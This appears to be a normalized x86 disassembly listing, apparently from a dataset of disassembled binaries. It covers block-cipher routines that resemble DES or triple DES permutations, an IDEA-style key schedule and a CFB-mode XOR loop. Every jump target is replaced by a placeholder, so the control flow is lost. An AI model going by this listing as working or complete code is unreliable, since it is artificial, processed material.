mov ch [ eax ]
inc eax
mov [ edx + 0x14 ] ecx
mov edi [ edx + 0x14 ]
xor ecx ecx
mov cl [ eax ]
or edi ecx
inc eax
xor ecx ecx
mov [ edx + 0x14 ] edi
mov ch [ eax ]
inc eax
mov [ edx + 0x18 ] ecx
mov ebx [ edx + 0x18 ]
xor ecx ecx
mov cl [ eax ]
or ebx ecx
inc eax
xor ecx ecx
mov [ edx + 0x18 ] ebx
mov cl [ eax ]
mov edi ecx
shl edi 0x8
xor ecx ecx
mov [ edx + 0x1c ] edi
mov cl [ eax + 0x1 ]
lea eax [ edx + 0x20 ]
or ecx edi
xor ebx ebx
mov [ edx + 0x1c ] ecx
mov ecx esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp edx
and esi 0x7f
shr ebp 0x7
shl esi 0x9
and ebp 0xffff
and edx 0x7f
or esi ebp
add ecx 0x20
shr edi 0x7
mov [ eax ] esi
and edi 0xffff
shl edx 0x9
add eax 0x4
or edx edi
mov [ eax ] edx
add eax 0x4
inc ebx
cmp ebx 0x6
jl r-xdata
mov edi [ ecx - 0x4 ]
mov edx [ ecx ]
mov esi edi
mov ebp edx
and esi 0x7f
and edx 0x7f
shr ebp 0x7
shl esi 0x9
and ebp 0xffff
add eax 0x4
or esi ebp
mov [ eax - 0x4 ] esi
mov esi [ ecx + 0x4 ]
mov ebp esi
and esi 0x7f
shr ebp 0x7
shl edx 0x9
and ebp 0xffff
add eax 0x4
or edx ebp
mov [ eax - 0x4 ] edx
mov edx [ ecx + 0x8 ]
mov ebp edx
and edx 0x7f
shr ebp 0x7
shl esi 0x9
and ebp 0xffff
add eax 0x4
or esi ebp
mov [ eax - 0x4 ] esi
mov esi [ ecx + 0xc ]
mov ebp esi
and esi 0x7f
shr ebp 0x7
shl edx 0x9
and ebp 0xffff
add eax 0x4
or edx ebp
mov [ eax - 0x4 ] edx
mov edx [ ecx + 0x10 ]
mov ebp edx
and edx 0x7f
shr ebp 0x7
shl esi 0x9
and ebp 0xffff
add eax 0x4
or esi ebp
mov [ eax - 0x4 ] esi
mov esi [ ecx + 0x14 ]
mov ebp esi
add eax 0x4
shr ebp 0x7
shl edx 0x9
and ebp 0xffff
or edx ebp
cmp ebx 0x5
mov [ eax - 0x4 ] edx
mov edx [ ecx - 0x8 ]
jge r-xdata
sub_10045440
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
add eax 0xc0
push esi
push edi
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] 0x0
mov ebx 0x10001
mov ecx 0x1
mov [ esp + 0x10 ] 0x0
xor ecx ecx
jmp r-xdata
test ecx ecx
jge r-xdata
imul eax ecx
mov edx ecx
mov ecx [ esp + 0x10 ]
mov ebx esi
mov esi edi
sub ecx eax
mov [ esp + 0x10 ] edx
jmp r-xdata
mov [ ebp ] ecx
mov ecx [ eax + 0x8 ]
neg ecx
add ebp 0x4
and ecx 0xffff
mov [ ebp ] ecx
mov edx [ eax + 0x4 ]
neg edx
add ebp 0x4
and edx 0xffff
mov [ ebp ] edx
mov esi [ eax + 0xc ]
add ebp 0x4
test esi esi
jne r-xdata
mov eax [ esp + 0x1c ]
add ecx 0x10001
mov eax ebx
cdq
idiv esi
mov eax ebx
mov edi edx
sub eax edi
cdq
idiv esi
test edi edi
je r-xdata
mov ebx 0x10001
mov ecx 0x1
mov [ esp + 0x10 ] 0x0
xor ecx ecx
jmp r-xdata
test ecx ecx
jge r-xdata
imul eax ecx
mov edx ecx
mov ecx [ esp + 0x10 ]
mov ebx esi
mov esi edi
sub ecx eax
mov [ esp + 0x10 ] edx
jmp r-xdata
mov [ ebp ] ecx
mov ecx [ esp + 0x14 ]
add ebp 0x4
cmp ecx 0x8
je r-xdata
mov eax [ esp + 0x1c ]
add ecx 0x10001
mov eax ebx
cdq
idiv esi
mov eax ebx
mov edi edx
sub eax edi
cdq
idiv esi
test edi edi
je r-xdata
mov ecx [ esp + 0x20 ]
pop edi
pop esi
pop ebp
mov eax [ ecx + 0x4 ]
mov edx [ ecx + 0x8 ]
mov [ ecx + 0x4 ] edx
mov edx [ ecx + 0xc8 ]
mov [ ecx + 0x8 ] eax
mov eax [ ecx + 0xc4 ]
mov [ ecx + 0xc4 ] edx
mov [ ecx + 0xc8 ] eax
pop ebx
add esp 0x8
retn
mov edx [ eax - 0x8 ]
sub eax 0x18
mov [ ebp ] edx
add ebp 0x4
mov edx [ eax + 0x14 ]
mov [ esp + 0x1c ] eax
mov [ ebp ] edx
add ebp 0x4
inc ecx
cmp ecx 0x9
mov [ esp + 0x14 ] ecx
jl r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
sub_100455a0
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0xc ]
xor ecx ecx
xor edx edx
push esi
mov cl [ eax ]
mov dh [ eax + 0x1 ]
inc eax
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or ecx edx
inc eax
xor edx edx
mov [ esp + 0x4 ] ecx
mov dl [ eax ]
inc eax
mov esi edx
xor edx edx
mov dh [ eax ]
xor ecx ecx
mov ch [ eax + 0x2 ]
or esi edx
mov cl [ eax + 0x1 ]
inc eax
mov eax [ esp + 0x24 ]
shl ecx 0x10
or ecx esi
pop esi
test eax eax
mov [ esp + 0x4 ] ecx
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
push ecx
lea eax [ esp + 0x8 ]
push edx
push eax
call sub_100463a0
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push edx
push eax
lea edx [ esp + 0x8 ]
push ecx
push edx
call sub_10046240
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
add esp 0x10
mov edx ecx
mov [ eax ] cl
inc eax
shr edx 0x8
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ esp + 0x4 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov [ eax + 0x1 ] cl
add esp 0x8
retn
sub_10045680
mov eax 0x14
call sub_1001d0d0
mov ecx [ esp + 0x30 ]
push ebx
push ebp
xor eax eax
mov al [ ecx ]
push esi
lea esi [ ecx + 0x1 ]
xor ecx ecx
xor ebp ebp
mov [ esp + 0xc ] esi
mov ch [ esi ]
xor edx edx
mov dl [ esi + 0x1 ]
or eax ecx
inc esi
xor ecx ecx
shl edx 0x10
mov cl [ esi + 0x1 ]
or eax edx
inc esi
xor edx edx
shl ecx 0x18
or eax ecx
inc esi
xor ecx ecx
mov ebx [ esp + 0x40 ]
mov cl [ esi ]
mov dh [ esi + 0x1 ]
inc esi
or ecx edx
inc esi
xor edx edx
push edi
mov edi [ ebx ]
mov dh [ esi + 0x1 ]
mov [ esp + 0x1c ] eax
mov dl [ esi ]
mov [ esp + 0x14 ] al
shl edx 0x10
or ecx edx
mov edx eax
shr edx 0x8
mov [ esp + 0x15 ] dl
mov edx eax
shr edx 0x10
mov [ esp + 0x16 ] dl
mov edx eax
shr edx 0x18
mov [ esp + 0x17 ] dl
mov edx ecx
shr edx 0x8
mov [ esp + 0x19 ] dl
mov edx ecx
shr edx 0x10
mov [ esp + 0x1a ] dl
mov edx ecx
shr edx 0x18
mov [ esp + 0x1b ] dl
mov edx [ esp + 0x30 ]
test edx edx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x18 ] cl
je r-xdata
mov [ ebx ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov [ esp + 0x30 ] edx
mov esi [ esp + 0x28 ]
mov dl [ esp + edi + 0x14 ]
xor dl [ esi ]
mov esi [ esp + 0x2c ]
mov [ esi ] dl
mov edx [ esp + 0x28 ]
inc esi
inc edx
mov [ esp + 0x28 ] edx
mov edx [ esp + 0x30 ]
inc edi
mov [ esp + 0x2c ] esi
and edi 0x7
dec edx
mov [ esp + 0x30 ] edx
jne r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
push eax
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
call sub_10046240
mov edx [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
mov ebx edx
mov eax edx
shr ebx 0x8
mov [ esp + 0x25 ] bl
mov [ esp + 0x24 ] dl
mov ebx edx
add esp 0x10
shr edx 0x18
shr ebx 0x10
mov [ esp + 0x17 ] dl
mov edx ecx
mov [ esp + 0x16 ] bl
mov ebx edx
shr ebx 0x8
mov [ esp + 0x19 ] bl
mov ebx edx
mov [ esp + 0x18 ] dl
shr ebx 0x10
shr edx 0x18
mov [ esp + 0x1a ] bl
mov ebx [ esp + 0x44 ]
mov [ esp + 0x1b ] dl
inc ebp
test edi edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx [ esp + 0x40 ]
mov esi [ esp + 0x10 ]
mov [ edx ] al
mov edx eax
shr edx 0x8
mov [ esi ] dl
mov edx eax
inc esi
shr edx 0x10
mov [ esi ] dl
inc esi
shr eax 0x18
mov [ esi ] al
inc esi
mov eax ecx
mov edx ecx
mov [ esi ] cl
inc esi
shr eax 0x8
mov [ esi ] al
inc esi
shr edx 0x10
shr ecx 0x18
mov [ esi ] dl
mov [ esi + 0x1 ] cl
sub_10045820
mov ecx [ esp + 0x4 ]
push ebx
push ebp
push esi
mov edx [ ecx + 0x4 ]
mov eax [ ecx ]
mov ecx edx
mov esi eax
shr ecx 0x4
and ecx 0xf0f0f0f
and esi 0xf0f0f0f
xor ecx esi
push edi
xor eax ecx
shl ecx 0x4
xor edx ecx
mov ecx eax
mov esi edx
shr ecx 0x10
and esi 0xffff
xor ecx esi
xor edx ecx
shl ecx 0x10
xor eax ecx
mov ecx edx
shr ecx 0x2
mov esi eax
and ecx 0x33333333
and esi 0x33333333
xor ecx esi
xor eax ecx
shl ecx 0x2
xor edx ecx
mov ecx eax
shr ecx 0x8
mov esi edx
and ecx 0xff00ff
and esi 0xff00ff
xor ecx esi
xor edx ecx
shl ecx 0x8
xor eax ecx
mov esi edx
shr esi 0x1
mov ecx eax
and esi 0x55555555
and ecx 0x55555555
xor esi ecx
mov ecx esi
xor ecx eax
lea eax [ esi + esi ]
xor eax edx
mov edx [ esp + 0x1c ]
ror ecx 0x1d
ror eax 0x1d
test edx edx
mov edx [ esp + 0x18 ]
je r-xdata
lea esi [ edx + 0x70 ]
mov [ esp + 0x18 ] 0x4
lea esi [ edx + 0x8 ]
mov [ esp + 0x18 ] 0x4
mov edx [ esi + 0xc ]
mov edi [ esi + 0x8 ]
xor edx ecx
xor edi ecx
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
shr ebp 0xa
and ebx 0x3f
and ebp 0x3f
mov ebx [ ebx * 4 + r--data ]
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi + 0x4 ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi ]
xor ebx ebp
xor eax ebx
xor edx eax
xor edi eax
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
shr ebp 0xa
mov ebx [ ebx * 4 + r--data ]
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi - 0x4 ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi - 0x8 ]
xor ebx ebp
xor ecx ebx
xor edx ecx
xor edi ecx
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
mov ebx [ ebx * 4 + r--data ]
sub esi 0x20
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi + 0x14 ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi + 0x10 ]
xor ebx ebp
xor eax ebx
xor edx eax
xor edi eax
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
shr ebp 0xa
mov ebx [ ebx * 4 + r--data ]
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ edi * 4 + r--data ]
xor ebx ebp
xor ebx edx
mov edx [ esp + 0x18 ]
xor ecx ebx
dec edx
mov [ esp + 0x18 ] edx
jne r-xdata
ror eax 0x3
ror ecx 0x3
mov edx ecx
mov esi eax
shr edx 0x1
and edx 0x55555555
and esi 0x55555555
xor edx esi
pop edi
xor eax edx
add edx edx
xor ecx edx
mov edx eax
shr edx 0x8
mov esi ecx
and edx 0xff00ff
and esi 0xff00ff
xor edx esi
xor ecx edx
shl edx 0x8
xor eax edx
mov edx ecx
shr edx 0x2
mov esi eax
and edx 0x33333333
and esi 0x33333333
xor edx esi
xor eax edx
shl edx 0x2
xor ecx edx
mov edx eax
mov esi ecx
shr edx 0x10
and esi 0xffff
xor edx esi
xor ecx edx
shl edx 0x10
xor eax edx
mov edx ecx
shr edx 0x4
mov esi eax
and edx 0xf0f0f0f
and esi 0xf0f0f0f
xor edx esi
mov esi edx
xor esi eax
mov eax [ esp + 0x10 ]
shl edx 0x4
mov [ eax ] esi
xor edx ecx
pop esi
pop ebp
mov [ eax + 0x4 ] edx
pop ebx
retn
mov edx [ esi - 0x4 ]
mov edi [ esi - 0x8 ]
xor edx ecx
xor edi ecx
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
shr ebp 0xa
and ebx 0x3f
and ebp 0x3f
mov ebx [ ebx * 4 + r--data ]
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
xor ebx ebp
xor eax ebx
mov edi eax
xor edi edx
mov edx [ esi + 0x4 ]
xor edx eax
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
shr ebp 0xa
mov ebx [ ebx * 4 + r--data ]
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi + 0xc ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi + 0x8 ]
xor ebx ebp
xor ecx ebx
xor edx ecx
xor edi ecx
ror edx 0x4
mov ebx edx
shr ebx 0x12
and ebx 0x3f
mov ebx [ ebx * 4 + r--data ]
mov ebp edx
shr ebp 0xa
and ebp 0x3f
add esi 0x20
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi - 0xc ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi - 0x10 ]
xor ebx ebp
xor eax ebx
xor edx eax
xor edi eax
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
shr ebp 0xa
mov ebx [ ebx * 4 + r--data ]
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ edi * 4 + r--data ]
xor ebx ebp
xor ebx edx
mov edx [ esp + 0x18 ]
xor ecx ebx
dec edx
mov [ esp + 0x18 ] edx
jne r-xdata
jmp r-xdata
sub_10045db0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
push ebx
push ebp
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
ror ecx 0x1d
ror eax 0x1d
push esi
push edi
test edx edx
mov edx [ esp + 0x18 ]
je r-xdata
lea esi [ edx + 0x70 ]
mov [ esp + 0x18 ] 0x4
lea esi [ edx + 0x8 ]
mov [ esp + 0x18 ] 0x4
mov edx [ esi + 0xc ]
mov edi [ esi + 0x8 ]
xor edx ecx
xor edi ecx
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
shr ebp 0xa
and ebx 0x3f
and ebp 0x3f
mov ebx [ ebx * 4 + r--data ]
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi + 0x4 ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi ]
xor ebx ebp
xor eax ebx
xor edx eax
xor edi eax
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
shr ebp 0xa
mov ebx [ ebx * 4 + r--data ]
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi - 0x4 ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi - 0x8 ]
xor ebx ebp
xor ecx ebx
xor edx ecx
xor edi ecx
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
mov ebx [ ebx * 4 + r--data ]
sub esi 0x20
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi + 0x14 ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi + 0x10 ]
xor ebx ebp
xor eax ebx
xor edx eax
xor edi eax
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
shr ebp 0xa
mov ebx [ ebx * 4 + r--data ]
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ edi * 4 + r--data ]
xor ebx ebp
xor ebx edx
mov edx [ esp + 0x18 ]
xor ecx ebx
dec edx
mov [ esp + 0x18 ] edx
jne r-xdata
mov edx [ esp + 0x14 ]
pop edi
ror eax 0x3
ror ecx 0x3
pop esi
pop ebp
mov [ edx ] eax
mov [ edx + 0x4 ] ecx
pop ebx
retn
mov edx [ esi - 0x4 ]
mov edi [ esi - 0x8 ]
xor edx ecx
xor edi ecx
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
shr ebp 0xa
and ebx 0x3f
and ebp 0x3f
mov ebx [ ebx * 4 + r--data ]
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
xor ebx ebp
xor eax ebx
mov edi eax
xor edi edx
mov edx [ esi + 0x4 ]
xor edx eax
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
shr ebp 0xa
mov ebx [ ebx * 4 + r--data ]
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi + 0xc ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi + 0x8 ]
xor ebx ebp
xor ecx ebx
xor edx ecx
xor edi ecx
ror edx 0x4
mov ebx edx
shr ebx 0x12
and ebx 0x3f
mov ebx [ ebx * 4 + r--data ]
mov ebp edx
shr ebp 0xa
and ebp 0x3f
add esi 0x20
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ esi - 0xc ]
xor ebx ebp
mov ebp [ edi * 4 + r--data ]
mov edi [ esi - 0x10 ]
xor ebx ebp
xor eax ebx
xor edx eax
xor edi eax
ror edx 0x4
mov ebx edx
mov ebp edx
shr ebx 0x12
and ebx 0x3f
shr ebp 0xa
mov ebx [ ebx * 4 + r--data ]
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edx
shr ebp 0x2
and ebp 0x3f
shr edx 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x12
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0xa
and ebp 0x3f
xor ebx [ ebp * 4 + r--data ]
mov ebp edi
shr ebp 0x2
and ebp 0x3f
shr edi 0x1a
xor ebx [ ebp * 4 + r--data ]
mov ebp [ edx * 4 + r--data ]
mov edx [ edi * 4 + r--data ]
xor ebx ebp
xor ebx edx
mov edx [ esp + 0x18 ]
xor ecx ebx
dec edx
mov [ esp + 0x18 ] edx
jne r-xdata
mov edx [ esp + 0x14 ]
pop edi
ror eax 0x3
ror ecx 0x3
pop esi
pop ebp
mov [ edx ] eax
mov [ edx + 0x4 ] ecx
pop ebx
retn
sub_10046240
push esi
mov esi [ esp + 0x8 ]
push edi
push 0x1
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edx ecx
mov edi eax
shr edx 0x4
and edx 0xf0f0f0f
and edi 0xf0f0f0f
xor edx edi
xor eax edx
shl edx 0x4
xor ecx edx
mov edx eax
mov edi ecx
shr edx 0x10
and edi 0xffff
xor edx edi
xor ecx edx
shl edx 0x10
xor eax edx
mov edx ecx
shr edx 0x2
mov edi eax
and edx 0x33333333
and edi 0x33333333
xor edx edi
xor eax edx
shl edx 0x2
xor ecx edx
mov edx eax
shr edx 0x8
mov edi ecx
and edx 0xff00ff
and edi 0xff00ff
xor edx edi
xor ecx edx
shl edx 0x8
xor eax edx
mov edx ecx
shr edx 0x1
mov edi eax
and edx 0x55555555
and edi 0x55555555
xor edx edi
mov edi edx
xor edi eax
lea eax [ edx + edx ]
xor eax ecx
mov ecx [ esp + 0x14 ]
push ecx
push esi
mov [ esi ] edi
mov [ esi + 0x4 ] eax
call sub_10045db0
mov edx [ esp + 0x20 ]
push 0x0
push edx
push esi
call sub_10045db0
mov eax [ esp + 0x30 ]
push 0x1
push eax
push esi
call sub_10045db0
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edx ecx
mov edi eax
shr edx 0x1
and edx 0x55555555
and edi 0x55555555
xor edx edi
add esp 0x24
xor eax edx
add edx edx
xor ecx edx
mov edx eax
shr edx 0x8
mov edi ecx
and edx 0xff00ff
and edi 0xff00ff
xor edx edi
xor ecx edx
shl edx 0x8
xor eax edx
mov edx ecx
shr edx 0x2
mov edi eax
and edx 0x33333333
and edi 0x33333333
xor edx edi
xor eax edx
shl edx 0x2
xor ecx edx
mov edx eax
mov edi ecx
shr edx 0x10
and edi 0xffff
xor edx edi
xor ecx edx
shl edx 0x10
xor eax edx
mov edx ecx
shr edx 0x4
mov edi eax
and edx 0xf0f0f0f
and edi 0xf0f0f0f
xor edx edi
mov edi edx
shl edx 0x4
xor edi eax
xor edx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edx
pop edi
pop esi
retn
sub_100463a0
push esi
mov esi [ esp + 0x8 ]
push edi
push 0x0
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edx ecx
mov edi eax
shr edx 0x4
and edx 0xf0f0f0f
and edi 0xf0f0f0f
xor edx edi
xor eax edx
shl edx 0x4
xor ecx edx
mov edx eax
mov edi ecx
shr edx 0x10
and edi 0xffff
xor edx edi
xor ecx edx
shl edx 0x10
xor eax edx
mov edx ecx
shr edx 0x2
mov edi eax
and edx 0x33333333
and edi 0x33333333
xor edx edi
xor eax edx
shl edx 0x2
xor ecx edx
mov edx eax
shr edx 0x8
mov edi ecx
and edx 0xff00ff
and edi 0xff00ff
xor edx edi
xor ecx edx
shl edx 0x8
xor eax edx
mov edx ecx
shr edx 0x1
mov edi eax
